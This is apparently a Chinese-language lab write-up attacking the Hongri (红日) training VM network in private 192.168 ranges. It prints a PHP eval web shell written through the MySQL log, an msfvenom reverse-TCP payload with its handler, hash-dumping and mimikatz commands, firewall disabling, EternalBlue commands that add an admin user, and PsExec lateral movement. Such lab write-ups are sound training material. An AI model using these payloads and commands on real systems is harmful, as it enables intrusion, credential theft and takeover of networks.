---
title: 红日安全1
date: '2023-12-10 18:22:56'
updated: '2023-12-30 20:30:50'
permalink: /post/red-day-safety-1-1x5auk.html
comments: true
toc: true
---

# 红日安全1

‍

# 环境搭建

在虚拟网络编辑器中添加一块网络适配器

ip设为192.168.52.0，仅主机模式

​![image](http://127.0.0.1:6806/assets/image-20231210182457-vo5h2ru.png)​

因为win7作为外网主机和内网联通需要两块网卡

添加一个nat网络适配器

另一块设为VMnet1的仅主机模式

​![image](http://127.0.0.1:6806/assets/image-20231210182608-i3p3qtt.png)​

将其他两个虚拟机都设为VMnet1

​![image](http://127.0.0.1:6806/assets/image-20231210182724-32j8ar7.png)​

内网ping一下可以联通

​![image](http://127.0.0.1:6806/assets/image-20231210182759-s665aji.png)​

外网也可以联通

​![image](http://127.0.0.1:6806/assets/image-20231210182837-svb11lw.png)​

打开phpstudy

​![image](http://127.0.0.1:6806/assets/image-20231210182903-jwp79df.png)​

主机端访问一下

​![image](http://127.0.0.1:6806/assets/image-20231210182950-jnhm8m1.png)​

# 信息收集

## nmap扫描端口

​​![image](http://127.0.0.1:6806/assets/image-20231210183656-cwyr6ev.png)​​​​

可以看到开放了三个端口80，135，3306。

## 端口访问

80端口是phpstudy页面

​![image](http://127.0.0.1:6806/assets/image-20231210183435-nc5zwma.png)​

## 扫描目录

​![image](http://127.0.0.1:6806/assets/image-20231210183914-kf7zc7b.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210183922-fv5bqft.png)​

可以看到有

http://192.168.52.143/phpmyadmin/

http://192.168.52.143/phpmyadmin/db_create.php

http://192.168.52.143:80/beifen.rar

http://192.168.52.143:80/phpinfo.php

http://192.168.52.143:80//l.php

这些文件

# 漏洞利用

## 弱口令

尝试登录后台

​![image](http://127.0.0.1:6806/assets/image-20231210184136-74p3akx.png)​

尝试后发现用户名为root密码为root

​![image](http://127.0.0.1:6806/assets/image-20231210191623-0hdhylk.png)​

## phpmyadmin漏洞利用

### 尝试写入文件

```sql
mysql   into写入文件：使用需看要secure_file_priv的值。
	value为“null”时，不允许读取任意文件
	value为其余路径时，表示该路径可以读写文件
	value为“空”时，允许读取任意文件

用show global variables like '%secure%' 命令查看
```

​![image](http://127.0.0.1:6806/assets/image-20231210191739-wmyztgb.png)​

结果为NULL表示不可写入文件

如果要修改需要通过mysql.ini配置文件修改

### 尝试通过日志写入木马

开启mysql日志功能：

```sql
	1.查看日志功能是否开启
	show global variables like '%general%'
	2.未开启的话设置为 on
	set global general_log='ON'
	3.开启后将日志文件的存储位置改为可访问到的目录， 根目录即可
	set global  general_log_file = 'C:/phpStudy/WWW/shell.php'
	4.执行下边一句话木马 
	数据库将会将查询语句保存在日志文件中
	SELECT '<?php @eval($_POST["cmd"]); ?>'
	5.写入成功后 使用蚁剑连接
```

​![image](http://127.0.0.1:6806/assets/image-20231210192331-jlx9pw2.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210192410-nwsczvp.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210192421-ba1mt8p.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210192714-a7faktq.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210192731-7a4gsz4.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210192802-p9fzn38.png)​

### 蚁剑连接

成功getshell

​![image](http://127.0.0.1:6806/assets/image-20231210192904-fywq36j.png)​

## <span style="font-weight: bold;" data-type="strong">yxcms</span>漏洞

可以看到在www目录下还有一个名为yxcms的网站目录

​![image](http://127.0.0.1:6806/assets/image-20231210200336-09ds3w8.png)​

### 弱口令

在公告处可以看到后台的地址和账号密码

​![image](http://127.0.0.1:6806/assets/image-20231210200412-sf9zxfa.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210200437-1a851h0.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210200453-jqo3x8i.png)​

在前台模板中写入木马

​![image](http://127.0.0.1:6806/assets/image-20231210201810-o2kljvv.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210201857-09nfecf.png)​

查一下保存路径

​![image](http://127.0.0.1:6806/assets/image-20231210202204-1kar95t.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210202632-r3dwww9.png)​

连接成功

### XSS

在留言板测试一下

​![image](http://127.0.0.1:6806/assets/image-20231210202845-24y84pn.png)​

后台审核发现弹窗

​![image](http://127.0.0.1:6806/assets/image-20231210202959-jjhwz88.png)​

‍

‍

## getwebshell后信息收集

### 判断是否存在域

```sql
判断方法
1.whoami hostname   对比
2.ipconfig /all 看DNS
3.systeminfo  看是否有域一栏
```

​![image](http://127.0.0.1:6806/assets/image-20231210194319-9pe4rb1.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210194545-at27dav.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210194619-vatw0f4.png)​

### 查看网络连接状态，进程，杀软，服务，是否可以出网，用户开放情况

```sql
1.ipconfig 看所处网段是否有多个
2.netstat -ano 查看网络连接和开放端口
3.net start  查看启动的服务  用于提权
4.tasklist   查看开启的进程
5.tasklist /SVC 复制到在线杀软识别 看存在的杀软情况  https://i.hacking8.com/tiquan
6. ping baidu  看是否可以出网等 
7. net user   存在用户
```

### 查看txt文件中是否有账号密码

# 后渗透

‍

```text
生成exe木马
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.177.129 LPORT=2333 -f exe > hack.exe 
```

* ​`-p windows/meterpreter/reverse_tcp`​：指定 payload 类型为反向 TCP Meterpreter shell，用于与目标主机建立一个反向连接。
* ​`LHOST=192.168.177.129`​：指定本机的 IP 地址作为监听主机（即攻击者主机），用于接收目标主机的连接。
* ​`LPORT=2333`​：指定本机的监听端口号，用于接收目标主机的连接请求。
* ​`-f exe`​：指定生成的文件格式为 Windows 可执行文件（exe）。

生成exe文件

​![image](http://127.0.0.1:6806/assets/image-20231210205352-bop2czr.png)​

```text
开启监听
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 2333
set lhost 192.168.177.129
exploit -j
```

​![image](http://127.0.0.1:6806/assets/image-20231210205432-1k617ai.png)​

​![image](http://127.0.0.1:6806/assets/image-20231210205443-d0l4ezh.png)​​​

上传exe文件至目标服务器并执行

​![image](http://127.0.0.1:6806/assets/image-20231211201230-4c9y1zq.png)​

连接

​![image](http://127.0.0.1:6806/assets/image-20231211201208-0y2nkxq.png)​

## 上线msf

运行hack.exe成功上线

​![image](http://127.0.0.1:6806/assets/image-20231211202056-esicgfy.png)​

​![image](http://127.0.0.1:6806/assets/image-20231211202719-s0sksro.png)​

## 信息收集

```text
msf arp 发现主机  开机状态下才可探测出 我现在只开了ip141的 所以下图只扫出141
run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24
```

​![image](http://127.0.0.1:6806/assets/image-20231211202944-uatgqtf.png)​

‍

可以看到同域的主机内网ip

```text
run post/multi/recon/local_exploit_suggester    
查看msf的提权
```

​`post/multi/recon/local_exploit_suggester`​ 是一个 Metasploit 模块，用于在目标主机上进行本地漏洞探测

​![image](http://127.0.0.1:6806/assets/image-20231211203259-bkrutbm.png)​

## 提权

```text
getuid查看服务器权限
getsystem 提权
getuid 查看是否提权成功
```

​![image](http://127.0.0.1:6806/assets/image-20231211203418-a08ryne.png)​

可以看到最开始时是Administrator权限，提权至System权限

## 获取域用户的密码信息

```text
以下3种都可尝试
1.run post/windows/gather/smart_hashdump
2.加载 kiwi模块
load kiwi     加载kiwi模块
creds_all    列出所有凭据
3.加载mimikatz模块
Windows10/2012 以下的版本可以直接抓取明文密码
	再尝试加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，
	而且该进程也需要 是system权限运行的。 
	ps 查看进程
migrate PID 
load mimikatz 
mimikatz_command -f sekurlsa::searchPasswords
```

### 账号hash

​![image](http://127.0.0.1:6806/assets/image-20231211210404-4l5lud0.png)​

```text
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against STU1
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20231211210329_default_192.168.177.144_windows.hashes_183335.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[*]     No users with password hints on this system
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```text
Windows系统下的hash密码格式为：
用户名称:RID:LM-HASH值:NT-HASH值
NT-HASH hash生产方式：

 1. 将明文口令转换成十六进制的格式 
 2. 转换成Unicode格式，即在每个字节之后添加0x00
 3. 对Unicode字符串作MD4加密，生成32位的十六进制数字串

eg：用户密码为test123
转换成十六进制的格式为74657374313233
转换成Unicode格式为7400650073007400310032003300
对字符串7400650073007400310032003300作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1
```

### mimikatz

加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，该进程也需要是system权限

```text
ps
migrate PID
load kiwi
kiwi_cmd -f sekurlsa::logonpasswords
```

​![image](http://127.0.0.1:6806/assets/image-20231212103545-7ycs6rq.png)​

​![image](http://127.0.0.1:6806/assets/image-20231212103748-5fc3ckf.png)​

选择一个system权限的进程

​![image](http://127.0.0.1:6806/assets/image-20231212103642-w933i1i.png)​

​​![image](http://127.0.0.1:6806/assets/image-20231212105218-w7e1p83.png)​​

<span style="font-weight: bold;" data-type="strong">这里有一点要注意</span>

mimikatz的x86无法访问x64

查看一下当前的pid

​![image](http://127.0.0.1:6806/assets/image-20231212105005-6l0lc11.png)​

​![image](http://127.0.0.1:6806/assets/image-20231212105026-9vcucsk.png)​

在进程里是一个x86程序

切换到x64下的程序

​![image](http://127.0.0.1:6806/assets/image-20231212105127-ukg5ntd.png)​

​![image](http://127.0.0.1:6806/assets/image-20231212105137-7ywbtwv.png)​

运行

​![image](http://127.0.0.1:6806/assets/image-20231212105239-wwu5hdz.png)​

​![image](http://127.0.0.1:6806/assets/image-20231212105250-jmnxu0e.png)​

查到了明文密码

## 3389远程控制端口开启

检查端口是否开启

​![image](http://127.0.0.1:6806/assets/image-20231212210128-9235ptc.png)​

开启3389

​`run post/windows/manage/enable_rdp`​

​![image](http://127.0.0.1:6806/assets/image-20231212210201-82fxq06.png)​

开启成功

再次扫描

​![image](http://127.0.0.1:6806/assets/image-20231212210332-ng1aebz.png)​

端口已经开启

## CS

### cs连接主机

​`/teamserver 192.168.177.129 ab262524`​

设置为kali的ip，后面是连接时的密码

​![image](http://127.0.0.1:6806/assets/image-20231212212744-ngbob1e.png)​

成功上线

​![image](http://127.0.0.1:6806/assets/image-20231212212802-ol0bzan.png)​

### 新建监听

​![image](http://127.0.0.1:6806/assets/image-20231212213338-v9t8ids.png)​

### 在CS上生成exe后门

​![image](http://127.0.0.1:6806/assets/image-20231212213440-3wekim9.png)​

选择刚刚建立的监听

​![image](http://127.0.0.1:6806/assets/image-20231212213501-ahvsuqj.png)​

通过蚁剑上传并运行

​![image](http://127.0.0.1:6806/assets/image-20231212213726-cnzuooz.png)​

​![image](http://127.0.0.1:6806/assets/image-20231212213801-58wbmqc.png)​

### CS上线

​![image](http://127.0.0.1:6806/assets/image-20231212213852-03a05vp.png)​

### CS对主机信息收集

Shell ipconfig查看目标机IP信息

```text
shell ipconfig
```

​![image](http://127.0.0.1:6806/assets/image-20231212214259-n9fb2ju.png)​

Whoami查看用户

```text
shell whoami
```

​​​![image](http://127.0.0.1:6806/assets/image-20231212214324-88u8cbg.png)​

查看域信息

```text
shell net config Workstation
```

​​​![image](http://127.0.0.1:6806/assets/image-20231212214404-moe1yv6.png)​

使用CS的mimikatz功能抓取目标机用户密码

​![image](http://127.0.0.1:6806/assets/image-20231212214506-4e67hqq.png)​

​![image](http://127.0.0.1:6806/assets/image-20231212214549-aza9045.png)​

​通过CS的elevate进行账户提权

​![image](http://127.0.0.1:6806/assets/image-20231212214624-5epq0dg.png)​

可以看到多了一条会话并且权限为system

​![image](http://127.0.0.1:6806/assets/image-20231212214921-dm9diab.png)​

# 内网攻击

横向渗透前，先将该web服务器配置为代理服务器当作跳板机。

目的：获取域控

## msf socks4a proxychains 穿透内网

可用msf直接搭建sock隧道：  
进入session，添加路由：

```text
run autoroute -s 192.168.52.0/24
```

​​![image](http://127.0.0.1:6806/assets/image-20231213194346-kbjj9n7.png)​

查看路由：

```text
route print
```

​![image](http://127.0.0.1:6806/assets/image-20231213194927-rzhbsjn.png)​

使用socks模块：

```text
use auxiliary/server/socks_proxy
run
```

​![image](http://127.0.0.1:6806/assets/image-20231213195519-h0djmmj.png)​

info查看，添加成功

​![image](http://127.0.0.1:6806/assets/image-20231213195623-hkhrdbn.png)​

配置 kali socks代理  
配置proxychains：

```text
vim proxychains4.conf 
```

​![image](http://127.0.0.1:6806/assets/image-20231213195708-1p6db42.png)​

### 测试

```text
proxychains curl 192.168.52.143
访问成功 说明 代理添加成功
proxychains nmap -sT -Pn 192.168.52.143
```

​![image](http://127.0.0.1:6806/assets/image-20231213195842-v5ahk5r.png)​

​![image](http://127.0.0.1:6806/assets/image-20231213201913-ene9i6s.png)​

## 域内信息收集

```text
net time /domain        #查看时间服务器
net user /domain        #查看域用户
net view /domain        #查看有几个域
net view /domain:GOD  #查看GOD	域情况
nslookup  主机名	 		#查看域内其他主机  可能ip查不出来
net group "domain computers" /domain         #查看域内所有的主机名
net group "domain admins"   /domain          #查看域管理员
net group "domain controllers" /domain       #查看域控
```

### 利用MSF的ARP模块扫描52网段

```text
use post/windows/gather/arp_scanner 
set rhosts 192.168.52.0/24
set session 1
exploit
```

​​![image](http://127.0.0.1:6806/assets/image-20231213203721-slz3jcu.png)​​

### 用CS扫描网段

​![image](http://127.0.0.1:6806/assets/image-20231213203942-3z64gfg.png)​

## 使用meterpreter关闭目标机上的防火墙

```text
netsh advfirewall set allprofiles state off
```

​![image](http://127.0.0.1:6806/assets/image-20231213204138-d5e660t.png)​

可以看到防火墙已经关闭

​![image](http://127.0.0.1:6806/assets/image-20231213204312-s7af4ik.png)​

## <span style="font-weight: bold;" data-type="strong">ms17-010漏洞（永恒之蓝）</span>

永恒之蓝漏洞通过 TCP 的445和139端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。不法分子就能在其电脑或服务器中植入勒索病毒、窃取用户隐私、远程控制木马等恶意程序。

<span style="font-weight: bold;" data-type="strong">影响版本</span>  
目前已知受影响的 Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。

### <span style="font-weight: bold;" data-type="strong">使用nmap的vuln漏洞扫描脚本进行扫描</span>

```text
nmap --script=vuln 192.168.177.144
```

​![image](http://127.0.0.1:6806/assets/image-20231213210409-dl5dxnu.png)​

可能存在ms17-010漏洞

​![image](http://127.0.0.1:6806/assets/image-20231213210550-xu55wsb.png)​

### <span style="font-weight: bold;" data-type="strong">使用msf辅助模块进行扫描，查看是否存在ms17-010漏洞</span>

```text
search ms17_010
```

搜索ms17-010相关模块，可以看到一共找到了4个不同的模块

​![image](http://127.0.0.1:6806/assets/image-20231213210742-lyf2kzg.png)​

```text
set RHOSTS 192.168.52.143
run
```

可以看到存在该漏洞

​![image](http://127.0.0.1:6806/assets/image-20231213211031-s0qnedh.png)​

### 永恒之蓝攻击

使用永恒之蓝攻击模块

```text
use exploit/windows/smb/ms17_010_eternalblue
```

设置攻击载荷

```text
set payload
```

设置目标主机

```text
set rhosts 192.168.52.143
```

​![image](http://127.0.0.1:6806/assets/image-20231213212105-ybx9s4h.png)​

可以看到最后弹出meterpreter

### 利用获取的服务器攻击其他主机

利用服务器上的nmap扫描内网主机

​![image](http://127.0.0.1:6806/assets/image-20231213212647-5npmxy5.png)​

```text
shell nmap --script=vuln 192.168.52.141
```

​![image](http://127.0.0.1:6806/assets/image-20231213213601-0h5u1rw.png)​

可以看到目标机可能存在ms17-010漏洞和MS08-067漏洞

​![image](http://127.0.0.1:6806/assets/image-20231213213631-ag140tu.png)​

试一下windows/smb/ms17_010_eternalblue模块，发现目标主机是32位的，换一个模块

​![image](http://127.0.0.1:6806/assets/image-20231213214111-twogz4h.png)​

```text
use auxiliary/admin/smb/ms17_010_command 
set COMMAND net user
set RHOST 192.168.52.141
exploit
```

攻击成功

​![image](http://127.0.0.1:6806/assets/image-20231213214222-vev4sf7.png)​

尝试添加用户

```text
set COMMAND net user xxxgg Ab262524! /add
exploit
```

执行成功

​![image](http://127.0.0.1:6806/assets/image-20231213214449-0mqi3l6.png)​

查看一下

​![image](http://127.0.0.1:6806/assets/image-20231213214552-evqj0xu.png)​

把添加的用户加入管理员组

```text
set COMMAND net localgroup administrators xxxgg /add
exploit
```

设置 `COMMAND`​ 参数为 `net localgroup administrators xxxgg /add`​，其中 `net localgroup administrators`​ 是 Windows 命令，用于执行本地组管理操作

​![image](http://127.0.0.1:6806/assets/image-20231213214743-t3y0xk9.png)​

查看

```text
set COMMAND net localgroup administrators
exploit
```

​![image](http://127.0.0.1:6806/assets/image-20231213215203-oszruf0.png)​

添加成功

### 利用ms17_010

通过ms17_010开启23端口与telnet服务

```text
set COMMAND sc config tlntsvr start= auto
```

​![image](http://127.0.0.1:6806/assets/image-20231214101502-wz2kwnl.png)​

```text
set COMMAND net start telnet
```

​![image](http://127.0.0.1:6806/assets/image-20231214101554-6fzul5f.png)查看端口是否开启

```text
set COMMAND netstat -an
```

​![image](http://127.0.0.1:6806/assets/image-20231214101659-epwxxut.png)​

进行telnet连接

```text
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.52.141
set USERNAME xxxgg
set PASSWORD Ab262524!
exploit
```

​![image](http://127.0.0.1:6806/assets/image-20231214102036-uxr6v4n.png)​

```text
sessions
```

​![image](http://127.0.0.1:6806/assets/image-20231214102054-rjm8ygi.png)​

​![image](http://127.0.0.1:6806/assets/image-20231214102810-gm0o3wz.png)​

连不上

### 攻击其他主机

```text
use auxiliary/admin/smb/ms17_010_command 
set COMMAND net user
set RHOST 192.168.52.138
exploit
```

​![image](http://127.0.0.1:6806/assets/image-20231214102951-ar8e6yy.png)​

攻击成功

## MS08_067漏洞

<span style="font-weight: bold;" data-type="strong">MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。</span>

当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。它影响了某些旧版本的Windows系统，包括：

* Windows 2000
* Windows XP
* Windows Server 2003

```text
use exploit/windows/smb/ms08_067_netapi
set rhost 192.168.52.141
set payload windows/meterpreter/bind_tcp
run
```

​![image](http://127.0.0.1:6806/assets/image-20231214103359-vu23dgv.png)​

报错Exploit completed, but no session was created.

建立不了连接

# 横向移动

## 在CS上使用psexec模块进行横向移动

​![image](http://127.0.0.1:6806/assets/image-20231214105316-9vicqag.png)​

​![image](http://127.0.0.1:6806/assets/image-20231214105343-fnld8yq.png)​

选择配置信息

上方是获得的用户密码

​![image](http://127.0.0.1:6806/assets/image-20231214105409-c7zyfmf.png)​

```text
PsExec64.exe -accepteula \\192.168.52.138 -u god\administrator -p Ab262524! -d -c C:\windows\temp\beacon64.exe
PsExec64.exe -accepteula \\192.168.52.138 -u god\administrator -p Ab262524! -s cmd
```
